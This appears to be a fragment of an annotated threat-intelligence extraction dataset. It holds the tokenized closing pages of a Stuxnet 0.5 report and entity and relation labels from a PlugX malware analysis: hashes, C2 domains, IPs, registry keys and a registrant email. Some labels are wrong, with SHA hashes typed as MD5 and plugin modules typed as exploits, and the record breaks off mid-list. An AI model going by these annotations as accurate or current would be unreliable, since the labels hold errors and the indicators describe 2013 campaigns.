"5", "Manual", "Valve", "RV", "5"], ["Relief", "Valve", "SV", "5", "Frequency", "Control", "Valve", "YV", "5", "Valve", "State", "Indicator"], ["FIA", "8", "Flow", "Rate", "Indicator", "Alarm", "FITC"], ["A", "Flow", "Rate", "Indicator", "Transmitter", "Controller", "FIT", "9", "Flow", "Rate", "Indicator", "Transmitter", "FIC", "C", "Flow", "Rate", "Indicator", "Controller", "FT", "C", "Flow", "Rate", "Transmitter", "MFC"], ["C", "Mass", "Flow", "Controller", "MFM", "C", "Mass", "Flow", "Meter", "Page", "15"], ["Stuxnet"], ["0.5"], [":"], ["The", "Missing", "Link", "Security", "Response", "Appendix", "D", "Organization", "of", "Stuxnet", "0.5", "components", "and", "behavior", "of", "each", "export", "."], ["Figure", "5", "Organization", "of", "Stuxnet", "0.5", "components", "Table", "9", "Payload", "exports", "for", "Outbreak.dll", "Payload", "exports", "Description", "Export", "1", "Infect", "Step", "7", "projects", "on", "insertion", "of", "removable", "drives", "Export", "2", "Hook", "Step", "7", "for", "Step", "7", "project", "infection", "Export", "4", "Uninstall", "routine", "Export", "5", "Verifies", "installation", "Export", "6", "Returns", "version", "number", "Export", "7", "Loads", "peer", "-", "to", "-", "peer", "communication", "data", "file", "Export", "8", ",", "9", ",", "and", "10", "Updates", "Stuxnet", "from", "infected", "Step", "7", "project", "archives", "Export", "11", "Inject", "module", "into", "services.exe", "Export", "12"], ["Install", "routine", "Export", "13", "Call", "export", "1", "Page", "16"], ["Stuxnet"], ["0.5"], [":"], ["The", "Missing", "Link", "Security", "Response", "Resources", "W32.Duqu", "http://www.symantec.com/security_response/writeup.jsp?docid=2011-101814-1119-99", "W32.Flamer", "http://www.symantec.com/security_response/writeup.jsp?docid=2012-052811-0308-99", "W32.Stuxnet"], ["http://www.symantec.com/security_response/writeup.jsp?docid=2010-071400-3123-99"], ["Multiple", "Siemens", "SIMATIC", "Products", "DLL", "Loading", "Arbitrary", "Code", "Execution", "Vulnerability", "(", "CVE-2012", "-", "3015", ")"], ["http://www.securityfocus.com/bid/54651", "Stuxnet", "0.5", ":", "The", "Missing", "Link", "http://www.symantec.com/connect/blogs/stuxnet-05-missing-link", "Stuxnet", "0.5", ":"], ["Disrupting", "Uranium", "Processing", "At", "Natanz", "http://www.symantec.com/connect/blogs/stuxnet-05-disrupting-uranium-processing-natanz", "Stuxnet", "0.5", ":", "How", "it", "Evolved"], ["http://www.symantec.com/connect/blogs/stuxnet-05-how-it-evolved"], ["Stuxnet", "0.5", ":", "Command", "-", "and", "-", "Control", "Capabilities", "http://www.symantec.com/connect/blogs/stuxnet-05-command-and-control-capabilities", "Community", "credits"], ["Symantec", "would", "like", "to", "thank", "the", "Institute", "for", "Science", "and", "International", "Security", "(", "ISIS", ")", "for", "their", "continued", "assistance", "in", "understanding", "centrifugal", "uranium", "enrichment", "systems", "."], ["Page", "17", "Security", "Response", "About", "Symantec", "Symantec", "protects", "the", "world", "\u2019s", "information", ",", "and", "is", "a", "global", "leader", "in", "security", ",", "backup", "and", "availability", "solutions", "."], ["Our", "innovative", "products", "and", "services", "protect", "people", "and", "information", "in", "any", "environment", "\u2013", "from", "the", "smallest", "mobile", "device", ",", "to", "the", "enterprise", "data", "center", ",", "to", "cloudbased", "systems", "."], ["Our", "world", "-", "renowned", "expertise", "in", "protecting", "data", ",", "identities", "and", "interactions", "gives", "our", "customers", "confidence", "in", "a", "connected", "world", "."], ["More", "information", "is", "available", "at", "www.symantec.com", "or", "by", "connecting", "with", "Symantec", "at", ":", "go.symantec.com/socialmedia", "."], ["About", "the", "authors"], ["Geoff", "McDonald", "-", "Threat", "Analysis", "Engineer", "Liam", "O", "Murchu", "-", "Development", "Manager", "Stephen", "Doherty", "-", "Sr", "Threat", "Intelligence", "Analyst"], ["Eric", "Chien", "-", "Distinguished", "Engineer", "For", "specific", "country", "offices", "and", "contact", "numbers", ",", "please", "visit", "our", "Web", "site", "."], ["For", "product", "information", "in", "the", "U.S.", ",", "call", "toll", "-", "free", "1", "(", "800", ")", "745", "6054", "."], ["Symantec", "Corporation", "World", "Headquarters", "350", "Ellis", "Street", "Mountain", "View", ",", "CA", "94043"], ["USA"], ["+1", "(", "650", ")", "527", "-", "8000", "www.symantec.com"], ["Copyright", "\u00a9", "2013", "Symantec", "Corporation", "."], ["All", "rights", "reserved", "."], ["Symantec", "and", "the", "Symantec", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Symantec", "Corporation", "or", "its", "affiliates", "in", "the", "U.S.", "and", "other", "countries", "."], ["Other", "names", "may", "be", "trademarks", "of", "their", "respective", "owners", "."], ["Any", "technical", "information", "that", "is", "made", "available", "by", "Symantec", "Corporation", "is", "the", "copyrighted", "work", "of", "Symantec", "Corporation", "and", "is", "owned", "by", "Symantec", "Corporation", "."], ["NO", "WARRANTY", "."], ["The", "technical", "information", "is", "being", "delivered", "to", "you", "as", "is", "and", "Symantec", "Corporation", "makes", "no", "warranty", "as", "to", "its", "accuracy", "or", "use", "."], ["Any", "use", "of", "the", "technical", "documentation", "or", "the", "information", "contained", "herein", "is", "at", "the", "risk", "of", "the", "user", "."], ["Documentation", "may", "include", "technical", "or", "other", "inaccuracies", "or", "typographical", "errors", "."], ["Symantec", "reserves", "the", "right", "to", "make", "changes", "without", "prior", "notice", "."]]}, {"vertexSet": [[{"name": "PlugX", "pos": [3, 4], "sent_id": 1, "type": "Malware"}], [{"name": "CIRCL", "pos": [2, 3], "sent_id": 2, "type": "Organization"}], [{"name": "March 29, 2013", "pos": [0, 4], "sent_id": 3, "type": "Time"}], [{"name": "Plugx", "pos": [19, 20], "sent_id": 865, "type": "Malware"}], [{"name": "UAC", "pos": [9, 10], "sent_id": 869, "type": "Software"}], [{"name": "Sample A", "pos": [1, 3], "sent_id": 872, "type": "Malware"}], [{"name": "update.exe", "pos": [3, 4], "sent_id": 874, "type": "File"}], [{"name": "f1f48360f95e1b43e9fba0fec5a2afb8", "pos": [3, 4], "sent_id": 875, "type": "MD5"}], [{"name": "70ceb467db7b0161d22e4545479f747417b9705a", "pos": [7, 8], "sent_id": 875, "type": "SHA-1"}], [{"name": "2bc5ce39dd9afe2157448d3f6d8cb9c549ed39543d159616e38480b9e6c11c49", "pos": [11, 12], "sent_id": 875, "type": "SHA-256"}], [{"name": "MS Windows", "pos": [9, 11], "sent_id": 878, "type": "Software"}], [{"name": "Sat Jun 9 15:19:49 2012", "pos": [0, 5], "sent_id": 883, "type": "Time"}], [{"name": "Sample B", "pos": [1, 3], "sent_id": 884, "type": "Malware"}], [{"name": "McAfee", "pos": [7, 8], "sent_id": 884, "type": "Organization"}], [{"name": "mcvsmap.exe", "pos": [0, 1], "sent_id": 888, "type": "File"}], [{"name": "4e1e0b8b0673937415599bf2f24c44ad", "pos": [0, 1], "sent_id": 892, "type": "MD5"}], [{"name": "9224de3af2a246011c6294f64f27206d165317ba", "pos": [4, 5], "sent_id": 892, "type": "SHA-1"}], [{"name": "ae16e10e621d6610a3f7f2c7122f9d1263700ba02d1b90e42798decb2fe84096", "pos": [3, 4], "sent_id": 893, "type": "SHA-256"}], [{"name": "MS Windows", "pos": [10, 12], "sent_id": 895, "type": "Software"}], [{"name": "Fri May 8 17:59:52 2009", "pos": [0, 5], "sent_id": 899, "type": "Time"}], [{"name": "McAfee", "pos": [0, 1], "sent_id": 901, "type": "Organization"}], [{"name": "5 : 2 4 PM 5/8/2009", "pos": [15, 21], "sent_id": 903, "type": "Time"}], [{"name": "McAfee", "pos": [10, 11], "sent_id": 904, "type": "Organization"}], [{"name": "McAfee VirusScan API", "pos": [10, 13], "sent_id": 906, "type": "Software"}], [{"name": "McVsMap.EXE", "pos": [11, 14], "sent_id": 910, "type": "File"}], [{"name": "4 e1e0b8b0673937415599bf2f24c44ad", "pos": [2, 4], "sent_id": 914, "type": "MD5"}], [{"name": "9224 de3af2a246011c6294f64f27206d165317ba", "pos": [6, 8], "sent_id": 914, "type": "MD5"}], [{"name": "ae16e10e621d6610a3f7f2c7122f9d1263700ba02d1b90e42798decb2fe84096", "pos": [10, 11], "sent_id": 914, "type": "MD5"}], [{"name": "Sample C", "pos": [12, 14], "sent_id": 914, "type": "Malware"}], [{"name": "Sample B", "pos": [20, 22], "sent_id": 914, "type": "Malware"}], [{"name": "Sample D", "pos": [24, 26], "sent_id": 914, "type": "Malware"}], [{"name": "McUtil.DLL", "pos": [3, 6], "sent_id": 919, "type": "File"}], [{"name": "ad4a646b38a482cc07d5b09b4\ufb00fd3b3", "pos": [3, 4], "sent_id": 920, "type": "MD5"}], [{"name": "ae0f9bf2740d00c5d485827eb32aca33feaa3a90", "pos": [7, 8], "sent_id": 920, "type": "SHA-1"}], [{"name": "0a99238e1ebebc47d7a89b2ccddfae537479f7f77322b5d4941315d3f7e5ca48", "pos": [3, 4], "sent_id": 921, "type": "SHA-256"}], [{"name": "MS Windows", "pos": [12, 14], "sent_id": 924, "type": "Software"}], [{"name": "Wed Mar 13 02:52:28 2013", "pos": [1, 7], "sent_id": 930, "type": "Time"}], [{"name": "Sample D", "pos": [1, 3], "sent_id": 931, "type": "Malware"}], [{"name": "Sample C", "pos": [10, 12], "sent_id": 931, "type": "Malware"}], [{"name": "Sample A", "pos": [4, 6], "sent_id": 932, "type": "Malware"}], [{"name": "McUtil.DLL.PPT", "pos": [3, 6], "sent_id": 934, "type": "File"}], [{"name": "545bb4365a9b7cdb6d22844ebeedda93", "pos": [3, 4], "sent_id": 935, "type": "MD5"}], [{"name": "a267f1183b4\ufb00843d68a63264846abf78cc71d1f", "pos": [3, 4], "sent_id": 936, "type": "SHA-1"}], [{"name": "d4fe890a08d4dd44b58a3b85b2a7e89536338099c1c42a9b7e85f4007b0a37b7", "pos": [0, 1], "sent_id": 938, "type": "SHA-256"}], [{"name": "Sample E", "pos": [1, 3], "sent_id": 939, "type": "Malware"}], [{"name": "dump00C60000.bin", "pos": [10, 11], "sent_id": 940, "type": "File"}], [{"name": "65ceb039e7b4731a165cfee081e220af", "pos": [3, 4], "sent_id": 941, "type": "MD5"}], [{"name": "b49766187971e3070644a9de2054bc93241b2263", "pos": [3, 4], "sent_id": 942, "type": "SHA-1"}], [{"name": "deeac56026f3804968348c8afa5b7aba10900aeabee05751c0fcac2b88c\ufb0071e", "pos": [7, 8], "sent_id": 942, "type": "SHA-256"}], [{"name": "Mon Nov 26 04:46:01 2012", "pos": [1, 6], "sent_id": 949, "type": "Time"}], [{"name": "Sample F", "pos": [1, 3], "sent_id": 950, "type": "Malware"}], [{"name": "UAC.TMP", "pos": [31, 32], "sent_id": 954, "type": "File"}], [{"name": "52df5c2c07433e2a8f054c2347acb3b4", "pos": [3, 4], "sent_id": 955, "type": "MD5"}], [{"name": "8051474c1fc0d8f404a42ea32eca1699e54f02e1", "pos": [7, 8], "sent_id": 955, "type": "SHA-1"}], [{"name": "dc09091e5d0ce03c6144748f17bd636f2f0b2ca56f88b550c1d48860596dbdb1", "pos": [3, 4], "sent_id": 956, "type": "SHA-256"}], [{"name": "MS Windows", "pos": [12, 14], "sent_id": 959, "type": "Software"}], [{"name": "Thu Mar 29 08:03:43 2012", "pos": [1, 6], "sent_id": 964, "type": "Time"}], [{"name": "CIRCL", "pos": [10, 11], "sent_id": 970, "type": "Organization"}], [{"name": "Windows", "pos": [20, 21], "sent_id": 972, "type": "Software"}], [{"name": "UAC", "pos": [31, 32], "sent_id": 972, "type": "Software"}], [{"name": "2013-03-26", "pos": [23, 28], "sent_id": 976, "type": "Time"}], [{"name": "Sample A", "pos": [5, 7], "sent_id": 998, "type": "Dropper"}], [{"name": "Sample B", "pos": [18, 20], "sent_id": 998, "type": "Malware"}], [{"name": "Sample C", "pos": [21, 23], "sent_id": 998, "type": "Malware"}], [{"name": "Sample D", "pos": [24, 26], "sent_id": 998, "type": "Malware"}], [{"name": "2009\u221205\u221214", "pos": [8, 9], "sent_id": 1005, "type": "Time"}], [{"name": "mcvsmap . exe", "pos": [3, 6], "sent_id": 1006, "type": "File"}], [{"name": "2013\u221203\u221213", "pos": [0, 1], "sent_id": 1007, "type": "Time"}], [{"name": "McUtil .DLL", "pos": [0, 2], "sent_id": 1009, "type": "File"}], [{"name": "2013\u221203\u221213", "pos": [0, 1], "sent_id": 1010, "type": "Time"}], [{"name": "McUtil .DLL.PPT", "pos": [0, 2], "sent_id": 1012, "type": "File"}], [{"name": "mcvsmap.exe", "pos": [18, 19], "sent_id": 1013, "type": "File"}], [{"name": "McAfee", "pos": [19, 20], "sent_id": 1014, "type": "Organization"}], [{"name": "McUtil.DLL", "pos": [11, 14], "sent_id": 1015, "type": "File"}], [{"name": "McAfee", "pos": [7, 8], "sent_id": 1016, "type": "Organization"}], [{"name": "McUtil.DLL", "pos": [97, 100], "sent_id": 1031, "type": "File"}], [{"name": "McUtil.DLL.PPT", "pos": [5, 8], "sent_id": 1033, "type": "File"}], [{"name": "McUtil.DLL.PPT", "pos": [19, 22], "sent_id": 1034, "type": "File"}], [{"name": "Sample E", "pos": [0, 2], "sent_id": 1047, "type": "Malware"}], [{"name": "Sample D", "pos": [11, 13], "sent_id": 1048, "type": "Malware"}], [{"name": "Sample E", "pos": [18, 20], "sent_id": 1048, "type": "Malware"}], [{"name": "Sample E", "pos": [38, 40], "sent_id": 1049, "type": "Malware"}], [{"name": "svchost.exe", "pos": [5, 6], "sent_id": 1050, "type": "File"}], [{"name": "msiexec.exe", "pos": [12, 13], "sent_id": 1050, "type": "File"}], [{"name": "User Account Control", "pos": [13, 16], "sent_id": 1051, "type": "CourseOfAction"}], [{"name": "Sample F", "pos": [12, 14], "sent_id": 1053, "type": "Malware"}], [{"name": "Sample B", "pos": [6, 8], "sent_id": 1058, "type": "Malware"}], [{"name": "XPlugOption.cpp", "pos": [46, 47], "sent_id": 1059, "type": "File"}], [{"name": "XPlugDisk.cpp", "pos": [47, 48], "sent_id": 1059, "type": "File"}], [{"name": "XPlugScreen.cpp", "pos": [48, 49], "sent_id": 1059, "type": "File"}], [{"name": "XPlugProcess.cpp", "pos": [49, 50], "sent_id": 1059, "type": "File"}], [{"name": "XPlugService.cpp", "pos": [50, 51], "sent_id": 1059, "type": "File"}], [{"name": "XPlugShell.cpp", "pos": [51, 52], "sent_id": 1059, "type": "File"}], [{"name": "XPlugTelnet.cpp", "pos": [52, 53], "sent_id": 1059, "type": "File"}], [{"name": "XPlugRegedit.cpp", "pos": [53, 54], "sent_id": 1059, "type": "File"}], [{"name": "XPlugNethood.cpp", "pos": [54, 55], "sent_id": 1059, "type": "File"}], [{"name": "XPlugPortMap.cpp", "pos": [55, 56], "sent_id": 1059, "type": "File"}], [{"name": "XPlugSQL.cpp", "pos": [56, 57], "sent_id": 1059, "type": "File"}], [{"name": "XPlugNetstat.cpp", "pos": [57, 58], "sent_id": 1059, "type": "File"}], [{"name": "XPlugKeyLogger.cpp", "pos": [58, 59], "sent_id": 1059, "type": "File"}], [{"name": "XPlugOption", "pos": [1, 2], "sent_id": 1087, "type": "Exploit"}], [{"name": "XPlugOption", "pos": [3, 4], "sent_id": 1088, "type": "Exploit"}], [{"name": "XPlugDisk", "pos": [2, 3], "sent_id": 1089, "type": "Exploit"}], [{"name": "XPlugDisk", "pos": [3, 4], "sent_id": 1090, "type": "Exploit"}], [{"name": "XPlugScreen", "pos": [5, 6], "sent_id": 1103, "type": "Exploit"}], [{"name": "XPlugProcess", "pos": [2, 3], "sent_id": 1105, "type": "Exploit"}], [{"name": "XPlugService", "pos": [3, 4], "sent_id": 1107, "type": "Exploit"}], [{"name": "XPlugShell", "pos": [13, 14], "sent_id": 1109, "type": "Exploit"}], [{"name": "XPlugTelnet", "pos": [57, 58], "sent_id": 1111, "type": "Exploit"}], [{"name": "XPlugRegedit", "pos": [1, 2], "sent_id": 1113, "type": "Exploit"}], [{"name": "XPlugNethood", "pos": [1, 2], "sent_id": 1117, "type": "Exploit"}], [{"name": "XPlugPortMap", "pos": [2, 3], "sent_id": 1118, "type": "Exploit"}], [{"name": "XPlugSQL", "pos": [2, 3], "sent_id": 1119, "type": "Exploit"}], [{"name": "XPlugNetstat", "pos": [2, 3], "sent_id": 1120, "type": "Exploit"}], [{"name": "XPlugKeyLogger", "pos": [4, 5], "sent_id": 1122, "type": "Exploit"}], [{"name": "C: \\ Documents and S e t t i n g s \\ A l l Users \\VirusMap", "pos": [18, 37], "sent_id": 1183, "type": "Indicator"}], [{"name": "HKEY_CURRENT_USER\\ Software \\ M i c r o s o f t \\Windows\\ CurrentVersion \\Run", "pos": [11, 26], "sent_id": 1185, "type": "Indicator"}], [{"name": "HKEY_LOCAL_MACHINE\\SYSTEM\\ ControlSet001 \\ S e r v i c e s \\VirusMap", "pos": [10, 22], "sent_id": 1186, "type": "Indicator"}], [{"name": "help.yahoo-upgrade.com", "pos": [13, 14], "sent_id": 1188, "type": "Indicator"}], [{"name": "122.199.194.197", "pos": [1, 2], "sent_id": 1189, "type": "Address"}], [{"name": "2013-03-26", "pos": [18, 23], "sent_id": 1190, "type": "Time"}], [{"name": "help . yahoo\u2212upgrade . com", "pos": [20, 25], "sent_id": 1191, "type": "Indicator"}], [{"name": "support . yahoo\u2212upgrade . com", "pos": [25, 30], "sent_id": 1191, "type": "Indicator"}], [{"name": "update . ayuisyahooapis . com", "pos": [30, 35], "sent_id": 1191, "type": "Indicator"}], [{"name": "support . ayuisyahooapis . com", "pos": [35, 40], "sent_id": 1191, "type": "Indicator"}], [{"name": "update . t r e n d m i c r o s o f t . co . i n", "pos": [40, 61], "sent_id": 1191, "type": "Indicator"}], [{"name": "122.199.128.0", "pos": [53, 54], "sent_id": 1197, "type": "Address"}], [{"name": "122.199.255.255", "pos": [55, 56], "sent_id": 1197, "type": "Address"}], [{"name": "ip@nexg . net", "pos": [1, 4], "sent_id": 1208, "type": "Email"}], [{"name": "5F SeoulAcademy B/D", "pos": [4, 9], "sent_id": 1208, "type": "Location"}], [{"name": "967\u22126 Daechi\u2212Dong", "pos": [10, 12], "sent_id": 1208, "type": "Location"}], [{"name": "Gangnam\u2212Gu, 135\u2212280", "pos": [13, 16], "sent_id": 1208, "type": "Location"}], [{"name": "122.199.128.0", "pos": [79, 80], "sent_id": 1213, "type": "Address"}], [{"name": "122.199.255.255", "pos": [81, 82], "sent_id": 1213, "type": "Address"}], [{"name": "YAHOO\u2212UPGRADE.COM", "pos": [32, 33], "sent_id": 1223, "type": "Indicator"}], [{"name": "JIANGSU BANGNING SCIENCE & TECHNOLOGY CO. LTD", "pos": [7, 15], "sent_id": 1224, "type": "Organization"}], [{"name": "DNS5. 4CUN.COM", "pos": [4, 7], "sent_id": 1228, "type": "Indicator"}], [{"name": "DNS6. 4CUN.COM", "pos": [3, 6], "sent_id": 1229, "type": "Indicator"}], [{"name": "08\u2212aug\u22122012", "pos": [6, 7], "sent_id": 1230, "type": "Time"}], [{"name": "18\u2212 j u l \u22122011", "pos": [10, 15], "sent_id": 1230, "type": "Time"}], [{"name": "18\u2212j u l \u22122013", "pos": [18, 22], "sent_id": 1230, "type": "Time"}], [{"name": "Wed, 27 Mar 2013", "pos": [32, 38], "sent_id": 1230, "type": "Time"}], [{"name": "yahoo\u2212upgrade . com", "pos": [53, 56], "sent_id": 1230, "type": "Indicator"}], [{"name": "whiteyoo_123@yahoo . com", "pos": [71, 74], "sent_id": 1230, "type": "Email"}], [{"name": "whiteyoo_123@yahoo . com", "pos": [6, 9], "sent_id": 1232, "type": "Email"}], [{"name": "whiteyoo_123@yahoo . com", "pos": [6, 9], "sent_id": 1234, "type": "Email"}], [{"name": "whiteyoo_123@yahoo . com", "pos": [12, 15], "sent_id": 1236, "type": "Email"}], [{"name": "PlugX", "pos": [8, 9], "sent_id": 1239, "type": "Malware"}], [{"name": "PlugX", "pos": [3, 4], "sent_id": 1245, "type": "Malware"}], [{"name": "\\PIPE\\a$PID", "pos": [5, 6], "sent_id": 1262, "type": "Indicator"}], [{"name": "\\PIPE\\b$PID", "pos": [6, 7], "sent_id": 1262, "type": "Indicator"}], [{"name": "\\PIPE\\RUN_AS_USER($PID)", "pos": [7, 9], "sent_id": 1262, "type": "Indicator"}], [{"name": "update.exe", "pos": [12, 13], "sent_id": 1263, "type": "File"}], [{"name": "f1f48360f95e1b43e9fba0fec5a2afb8", "pos": [22, 23], "sent_id": 1263, "type": "MD5"}], [{"name": "70 ceb467db7b0161d22e4545479f747417b9705a", "pos": [23, 25], "sent_id": 1263, "type": "SHA-1"}], [{"name": "bc5ce39dd9afe2157448d3f6d8cb9c549ed39543d159616e38480b9e6c11c49", "pos": [26, 27], "sent_id": 1263, "type": "SHA-256"}], [{"name": "mcvsmap.exe", "pos": [28, 29], "sent_id": 1263, "type": "File"}], [{"name": "4 e1e0b8b0673937415599bf2f24c44ad", "pos": [38, 40], "sent_id": 1263, "type": "MD5"}], [{"name": "9224 de3af2a246011c6294f64f27206d165317ba", "pos": [40, 42], "sent_id": 1263, "type": "SHA-1"}], [{"name": "ae16e10e621d6610a3f7f2c7122f9d1263700ba02d1b90e42798decb2fe84096", "pos": [42, 43], "sent_id": 1263, "type": "SHA-256"}], [{"name": "McUtil.DLL", "pos": [0, 3], "sent_id": 1264, "type": "File"}], [{"name": "ad4a646b38a482cc07d5b09b4fffd3b3", "pos": [16, 17], "sent_id": 1264, "type": "MD5"}], [{"name": "ae0f9bf2740d00c5d485827eb32aca33feaa3a90", "pos": [17, 18], "sent_id": 1264, "type": "SHA-1"}], [{"name": "0 a99238e1ebebc47d7a89b2ccddfae537479f7f77322b5d4941315d3f7e5ca48", "pos": [18, 20], "sent_id": 1264, "type": "SHA-256"}], [{"name": "McUtil.DLL.PPT", "pos": [30, 33], "sent_id": 1265, "type": "File"}], [{"name": "545 bb4365a9b7cdb6d22844ebeedda93", "pos": [42, 44], "sent_id": 1265, "type": "MD5"}], [{"name": "a267f1183b4ff843d68a63264846abf78cc71d1f", "pos": [0, 1], "sent_id": 1266, "type": "SHA-1"}], [{"name": "d4fe890a08d4dd44b58a3b85b2a7e89536338099c1c42a9b7e85f4007b0a37b7", "pos": [1, 2], "sent_id": 1266, "type": "SHA-256"}], [{"name": "UAC.TMP", "pos": [3, 4], "sent_id": 1266, "type": "File"}], [{"name": "52 df5c2c07433e2a8f054c2347acb3b4", "pos": [13, 15], "sent_id": 1266, "type": "MD5"}], [{"name": "8051474 c1fc0d8f404a42ea32eca1699e54f02e1", "pos": [15, 17], "sent_id": 1266, "type": "SHA-1"}], [{"name": "dc09091e5d0ce03c6144748f17bd636f2f0b2ca56f88b550c1d48860596dbdb1", "pos": [17, 18], "sent_id": 1266, "type": "SHA-256"}], [{"name": "C: \\ ProgramData\\VirusMap", "pos": [34, 38], "sent_id": 1266, "type": "Indicator"}], [{"name": "C: \\ Users \\ A l l Users \\VirusMap", "pos": [42, 52], "sent_id": 1266, "type": "Indicator"}], [{"name": "C: \\ Documents and S e t t i n g s \\ A l l Users \\VirusMap", "pos": [56, 75], "sent_id": 1266, "type": "Indicator"}], [{"name": "%ALLUSERSPROFILE%\\SxS\\bug . l o g", "pos": [79, 85], "sent_id": 1266, "type": "Indicator"}], [{"name": "C: \\ Documents and S e t t i n g s \\ A l l Users \\VirusMap\\NvSmart . hlp", "pos": [85, 106], "sent_id": 1266, "type": "Indicator"}], [{"name": "HKEY_LOCAL_MACHINE\\SYSTEM\\ ControlSet001 \\ S e r v i c e s \\VirusMap", "pos": [109, 121], "sent_id": 1266, "type": "Indicator"}], [{"name": "Sample B", "pos": [135, 137], "sent_id": 1266, "type": "Malware"}], [{"name": "HKEY_CURRENT_USER\\ Software \\ M i c r o s o f t \\Windows\\ CurrentVersion \\Run", "pos": [138, 153], "sent_id": 1266, "type": "Indicator"}], [{"name": "Sample B", "pos": [167, 169], "sent_id": 1266, "type": "Malware"}], [{"name": "help . yahoo\u2212upgrade . com", "pos": [179, 184], "sent_id": 1266, "type": "Indicator"}], [{"name": "122.199.194.197", "pos": [185, 186], "sent_id": 1266, "type": "Address"}], [{"name": "Sample A", "pos": [10, 12], "sent_id": 1280, "type": "Malware"}], [{"name": "Sample B", "pos": [16, 18], "sent_id": 1346, "type": "Malware"}], [{"name": "mcvsmap.exe", "pos": [19, 20], "sent_id": 1346, "type": "File"}], [{"name": "Sample C", "pos": [15, 17], "sent_id": 1349, "type": "Malware"}], [{"name": "McUtil.DLL", "pos": [1, 4], "sent_id": 1350, "type": "File"}], [{"name": "Sample D", "pos": [16, 18], "sent_id": 1411, "type": "Malware"}], [{"name": "McUtil.DLL.PPT", "pos": [1, 4], "sent_id": 1412, "type": "File"}], [{"name": "Sample E", "pos": [1, 3], "sent_id": 1414, "type": "Malware"}], [{"name": "Sample F", "pos": [1, 3], "sent_id": 1415, "type": "Malware"}], [{"name": "UAC.TMP", "pos": [4, 5], "sent_id": 1415, "type": "File"}]], "labels": [{"r": "P17", "h": 22, "t": 23, "evidence": [904, 906]}, {"r": "P21", "h": 177, "t": 178, "evidence": [1266]}, {"r": "P21", "h": 179, "t": 180, "evidence": [1266]}, {"r": "P21", "h": 185, "t": 184, "evidence": [1346]}, {"r": "P21", "h": 187, "t": 186, "evidence": [1349, 1350]}, {"r": "P21", "h": 189, "t": 188, "evidence": [1411, 1412]}, {"r": "P21", "h": 192, "t": 191, "evidence": [1415]}, {"r": "P21", "h": 7, "t": 5, "evidence": [872, 875]}, {"r": "P21", "h": 6, "t": 5, "evidence": [872, 874]}, {"r": "P21", "h": 8, "t": 5, "evidence": [872, 875]}, {"r": "P21", "h": 9, "t": 5, "evidence": [872, 875]}, {"r": "P21", "h": 14, "t": 12, "evidence": [884, 888]}, {"r": "P21", "h": 15, "t": 12, "evidence": [884, 892]}, {"r": "P21", "h": 16, "t": 12, "evidence": [884, 892]}, {"r": "P21", "h": 17, "t": 12, "evidence": [884, 893]}, {"r": "P21", "h": 31, "t": 28, "evidence": [914, 919]}, {"r": "P21", "h": 32, "t": 28, "evidence": [914, 920]}, {"r": "P21", "h": 33, "t": 28, "evidence": [914, 920]}, {"r": "P21", "h": 34, "t": 28, "evidence": [914, 921]}, {"r": "P21", "h": 40, "t": 37, "evidence": [931, 934]}, {"r": "P21", "h": 41, "t": 37, "evidence": [931, 935]}, {"r": "P21", "h": 43, "t": 37, "evidence": [931, 938]}, {"r": "P21", "h": 42, "t": 37, "evidence": [931, 936]}, {"r": "P21", "h": 45, "t": 44, "evidence": [939, 940]}, {"r": "P21", "h": 46, "t": 44, "evidence": [939, 941]}, {"r": "P21", "h": 47, "t": 44, "evidence": [939, 942]}, {"r": "P21", "h": 48, "t": 44, "evidence": [939, 942]}, {"r": "P21", "h": 51, "t": 50, "evidence": [950, 954]}, {"r": "P21", "h": 52, "t": 50, "evidence": [950, 955]}, {"r": "P21", "h": 53, "t": 50, "evidence": [950, 955]}, {"r": "P21", "h": 54, "t": 50, "evidence": [950, 956]}, {"r": "P21", "h": 87, "t": 100, "evidence": [1059, 1087]}, {"r": "P21", "h": 88, "t": 102, "evidence": [1059, 1089]}, {"r": "P21", "h": 89, "t": 104, "evidence": [1059, 1103]}, {"r": "P21", "h": 90, "t": 105, "evidence": [1059, 1105]}, {"r": "P21", "h": 91, "t": 106, "evidence": [1059, 1107]}, {"r": "P21", "h": 92, "t": 107, "evidence": [1059, 1109]}, {"r": "P21", "h": 93, "t": 108, "evidence": [1059, 1111]}, {"r": "P21", "h": 94, "t": 109, "evidence": [1059, 1113]}, {"r": "P21", "h": 95, "t": 110, "evidence": [1059, 1117]}, {"r": "P21", "h": 96, "t": 111, "evidence": [1059, 1118]}, {"r": "P21", "h": 97, "t": 112, "evidence": [1059, 1119]}, {"r": "P21", "h": 98, "t": 113, "evidence": [1059, 1120]}, {"r": "P21", "h": 99, "t": 114, "evidence": [1059, 1122]}, {"r": "P21", "h": 115, "t": 148, "evidence": [1183, 1245]}, {"r": "P21", "h": 116, "t": 148, "evidence": [1185, 1245]}, {"r": "P21", "h": 117, "t": 148, "evidence": [1186, 1245]}, {"r": "P21", "h": 118, "t": 148, "evidence": [1188, 1245]}, {"r": "P21", "h": 119, "t": 148, "evidence": [1189, 1245]}, {"r": "P21", "h": 121, "t": 148, "evidence": [1191, 1245]}, {"r": "P21", "h": 122, "t": 148, "evidence": [1191, 1245]}, {"r": "P21", "h": 123, "t": 148, "evidence": [1191, 1245]}, {"r": "P21", "h": 124, "t": 148, "evidence": [1191, 1245]}, {"r": "P21", "h": 125, "t": 148, "evidence": [1191, 1245]}, {"r": "P21", "h": 126, "t": 148, "evidence": [1197, 1245]}, {"r": "P21", "h": 127, "t": 148, "evidence": [1197, 1245]}, {"r": "P21", "h": 128, "t": 148, "evidence": [1208, 1245]}, {"r": "P21", "h": 132, "t": 148, "evidence": [1213, 1245]}, {"r": "P21", "h": 133, "t": 148, "evidence": [1213, 1245]}, {"r": "P21", "h": 134, "t": 148, "evidence": [1223, 1245]}, {"r": "P21", "h": 136, "t": 148, "evidence": [1228, 1245]}, {"r": "P21", "h": 137, "t": 148, "evidence": [1229, 1245]}, {"r": "P21", "h": 142, "t": 148, "evidence": [1230, 1245]}, {"r": "P21", "h": 143, "t": 148, "evidence": [1230, 1245]}, {"r": "P21", "h": 144, "t": 148, "evidence": [1232, 1245]}, {"r": "P21", "h": 145, "t": 148, "evidence": [1234, 1245]}, {"r": "P21", "h": 146, "t": 148, "evidence": [1236, 1245]}, {"r": "P21", "h": 149, "t": 148, "evidence": [1245, 1262]}, {"r": "P21", "h": 150, "t": 148, "evidence": [1245, 1262]}, {"r": "P21", "h": 151, "t": 148, "evidence": [1245, 1262]}, {"r": "P21", "h": 172, "t": 148, "evidence": [1245, 1266]}, {"r": "P21", "h": 173, "t": 148, "evidence": [1245, 1266]}, {"r": "P21", "h": 174, "t": 148, "evidence": [1245, 1266]}, {"r": "P21", 